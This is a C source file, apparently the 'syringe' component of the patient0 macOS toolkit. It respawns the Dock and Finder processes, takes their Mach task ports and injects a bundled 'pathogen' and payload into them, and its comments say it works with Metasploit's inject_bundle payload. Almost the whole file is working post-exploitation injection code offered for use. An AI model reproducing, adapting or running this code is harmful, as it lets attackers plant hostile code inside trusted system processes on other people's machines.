/* 
 * TODO:
 * - merge runtime and bundle logic
 * - move payload building into infect()
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <patient0/infect.h>
#include <patient0/process.h>
#include <patient0/runtime.h>
#include <patient0/spawn.h>
#include <patient0/log.h>
#include <crt_externs.h>

#include <fcntl.h>
#include <unistd.h>

#include "patient0_bundle.h"

static char *dock_argv[] = {
  "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock",
  NULL,
};

static char *finder_argv[] = {
  "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
  NULL
};

static const struct timespec sleep_time = { .tv_sec = 5, .tv_nsec = 500000000 };

static bool inject_pathogen(mach_port_t *ports,
                            unsigned char *pathogen,
                            uint32_t size,
                            unsigned char *ppayload,
                            uint32_t ppayload_size) {
  thread_act_t thread;
  unsigned char *payload = NULL;
  uint32_t payload_size = 0;
  unsigned char *cursor = NULL;
  bool success = true;

  if (!ports || !ports[0]) {
    return false;
  }

  p0_logf(P0_INFO, "sizes to merge: (%d,%d,4,%d,4,4)", patient0_bundle_len, size, ppayload_size);
  if (size > UINT_MAX - (patient0_bundle_len + sizeof(uint32_t) + sizeof(uint32_t))) {
    p0_logf(P0_ERR, "pathogen waaay too large");
    return false;
  }
  payload_size = size + patient0_bundle_len + sizeof(uint32_t) + sizeof(uint32_t);
  if (ppayload_size > UINT_MAX - (ppayload_size + sizeof(uint32_t))) {
    p0_logf(P0_ERR, "pathogen payload waaay too large");
    return false;
  }
  payload_size += ppayload_size + sizeof(uint32_t);
  p0_logf(P0_INFO, "total payload size: %d", payload_size);

  payload = malloc(payload_size);
  cursor = payload;
  if (!payload) {
    p0_logf(P0_ERR, "failed to allocate space for final payload");
    return false;
  }
  /* Construct the patient0/pathogen bundle as follows:
   * +-----------+
   * | patient0  |
   * +-----------+
   * | pathogen  |
   * +-----------+
   * | uint32 sz |
   * +-----------+
   * | ppayload  |
   * +-----------+
   * | uint32 sz |
   * +-----------+
   * | uint32 sz |
   * +-----------+
   * TODO: move this to infect() to save on allocations, etc
   */
  memcpy(cursor, patient0_bundle, patient0_bundle_len);
  cursor += patient0_bundle_len;

  memcpy(cursor, pathogen, size);
  cursor += size;

  *((uint32_t *) cursor) = size;
  cursor += sizeof(uint32_t);

  memcpy(cursor, ppayload, ppayload_size);
  cursor += ppayload_size;

  *((uint32_t *) cursor) = ppayload_size;
  cursor += sizeof(uint32_t);
  *((uint32_t *) cursor) =  ppayload_size + sizeof(uint32_t) + size + sizeof(uint32_t); /* The last int is expected: sizeof(uint32_t) */

  /* Finally, infect the mach task! */
  while (*ports != 0) {
    p0_logf(P0_INFO, "infecting [%d] with payload size %u", *ports, payload_size);
    if (!infect(*ports, payload, payload_size, &thread)) {
      p0_logf(P0_ERR, "failed to infect task");
      success = false;
    }
    ports++;
  }
  return success;
}

static bool install_pathogen_default(unsigned char *pathogen,
                                     uint32_t size,
                                     unsigned char *payload,
                                     uint32_t payload_size) {

  mach_port_t ports[3] = { MACH_PORT_NULL, MACH_PORT_NULL, 0 };
  mach_port_t dock_port = MACH_PORT_NULL;
  mach_port_t finder_port = MACH_PORT_NULL;
  uint32_t port_index = 0;
  pid_t finder_pid = -1;
  pid_t dock_pid = -1;
  /* is this a bad addr? */
  //char **environ = (char **)_NSGetEnviron();
  char  *environ[] = { 0 };
  time_t wait_until = 0;

  /* Find finder and dock */
  dock_pid = process_find("Dock");
  finder_pid = process_find("Finder");

  /* Respawn both */
  if (dock_pid > 0) {
    p0_logf(P0_INFO, "replacing Dock (%d)", dock_pid);
  }
  spawn(dock_argv[0], dock_argv, environ, &dock_port, dock_pid);
  if (finder_pid > 0) {
    /* TODO: run a small kill loop for finder? */
    p0_logf(P0_INFO, "replacing Finder (%d)", finder_pid);
  }
  spawn(finder_argv[0], finder_argv, environ, &finder_port, finder_pid);
  /* Let's chill for a few seconds to let them load their dynamic libraries and
   * get bootstrapped.
   */
  /* We do a spinwait as nanosleep seems to be misbehaving */
  p0_logf(P0_INFO, "sleeping before infection: %d", time(NULL));
  /*
  nanosleep(&sleep_time, NULL);
  */
  wait_until = time(NULL) + 5;
  while (time(NULL) < wait_until) { sched_yield(); }
  p0_logf(P0_INFO, "ready to infect now: %d", time(NULL));

  /* Inject!
   * inject_pathogen takes an array of ports so we don't have to deal
   * with rebuilding the payload each time.
   */
  if (dock_port != MACH_PORT_NULL) {
    ports[port_index++] = dock_port;
    p0_logf(P0_INFO, "have Dock port: %d", dock_port);
  }
  if (finder_port != MACH_PORT_NULL) {
    ports[port_index++] = finder_port;
    p0_logf(P0_INFO, "have Finder port: %d", finder_port);
  }
  return inject_pathogen(ports, pathogen, size, payload, payload_size);
}

static void crash(uint32_t err) {
  *((uint32_t *)err) = 0xdeadbeef;
}

/* Bundle function compatible with Metasploit's inject_bundle payload.
 * Expects:
 * - fd to be a valid file descriptor
 * - a 4-byte uint32_t size to be written to the fd
 * - a bundle of the given size to be written
 * With a bundle, syringe will attempt to inject patient0+bundle in to
 * Dock and Finder (losing their psn values..).
 * TODO: bust this up into testable functions
 */
void run(int fd) {
  unsigned char *pathogen = NULL;
  uint32_t pathogen_size = 0;
  unsigned char *payload = NULL;
  uint32_t payload_size = 0;
  /* Bail on a bad fd */
  if (fd < 0) {
    p0_logf(P0_ERR, "bad file descriptor given.");
    crash(0x2);
    runtime_deadlock();  /* We're done :/ */
  }

  /* Read the length */
  if (read(fd, &pathogen_size, sizeof(uint32_t)) != sizeof(uint32_t)) {
    p0_logf(P0_ERR, "failed to read pathogen");
    /* TODO: provide an option to forcibly exit instead */
    crash(0x3);
    runtime_deadlock();  /* We're done :/ */
  }
  p0_logf(P0_INFO, "expects pathogen of size: %d", pathogen_size);

  /* Get the bundle. */
  if (pathogen_size) {
    unsigned char *cur;
    int ret = 0;
    pathogen = malloc(pathogen_size);
    if (!pathogen) {
      p0_logf(P0_ERR, "failed to allocate pathogen destination");
      crash(0x4);
      runtime_deadlock();
    }
    cur = pathogen;
    while (cur < pathogen + pathogen_size) {
      if ((ret = read(fd, cur, pathogen_size)) < 0) {
        free(pathogen);
        p0_logf(P0_ERR, "failed to read pathogen: %d [%d]", ret, cur - pathogen);
        crash(0x5);
        runtime_deadlock();
      }
      cur += ret;
    }
  }

  /* Read the pathogen payload */
  if (read(fd, &payload_size, sizeof(uint32_t)) != sizeof(uint32_t)) {
    p0_logf(P0_ERR, "failed to read payload");
    /* TODO: provide an option to forcibly exit instead */
    crash(0x6);
    runtime_deadlock();  /* We're done :/ */
  }
  p0_logf(P0_INFO, "expects pathogen payload of size: %d", payload_size);

  /* Get the bundle. */
  if (payload_size) {
    payload = malloc(payload_size);
    if (!payload) {
      p0_logf(P0_ERR, "failed to allocate payload destination");
      crash(0x7);
      runtime_deadlock();
    }
    /* XXX: This needs to be fixed and currently isn't used. */
    if (read(fd, payload, payload_size) != payload_size) {
      free(payload);
      p0_logf(P0_ERR, "failed to read payload");
      crash(0x8);
      runtime_deadlock();
    }
  }

  p0_logf(P0_INFO, "installing the pathogen and payload");
  install_pathogen_default(pathogen, pathogen_size, payload, payload_size);
  /* Shut it down! */
  _exit(0);
}

#ifndef SYRINGE_BUNDLE
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

/* file_map
 * maps a given file into memory returning the size in size
 * and the address via the return value.
 */
unsigned char *file_load(const char *path, size_t *size) {
  void *addr = NULL;
  int fd = open(path, O_RDONLY);
  struct stat stat_buf;

  if (fd < 0) {
    p0_logf(P0_FATAL, "failed to open file: %s", path);
  }

  if (fstat(fd, &stat_buf) < 0) {
    p0_logf(P0_FATAL, "failed to extract file size: %s", path);
  }

  *size = stat_buf.st_size;

  addr = mmap(NULL, *size, PROT_READ, MAP_PRIVATE, fd, 0);
  close(fd);
  if (!addr) {
    p0_logf(P0_FATAL, "failed to map in file: %s", path);
  }

  return (unsigned char *)addr;
}


int main(int argc, char **argv, char **envp) {
  unsigned char *pathogen = NULL;
  size_t pathogen_size = 0;
  thread_act_t thread;
  mach_port_t port = MACH_PORT_NULL;
  pid_t replace_me = 0;
  pid_t pid = -1;
  char **new_argv = NULL;
  char **new_envp = NULL;

  if (argc < 2) {
    printf("Usage:\n%s </pathogen/bundle> [<pid> <path/to/bin> [args]]\n",
           argv[0]);
    return 1;
  }

  if (argc > 1) {
    /* Read in the pathogen */
    pathogen = file_load(argv[1], &pathogen_size);
  }

  if (argc > 2) {
    replace_me = atoi(argv[2]);
    new_argv = &argv[3];
    new_envp = envp;
    p0_logf(P0_INFO, "infecting '%s'", new_argv[0]);
  }

  /* Use the same helper we use in run() */
  install_pathogen_default(pathogen, pathogen_size, NULL, 0);
  p0_logf(P0_INFO, "infection underway");
  return 0;
}
#endif  /* SYRINGE_BUNDLE */
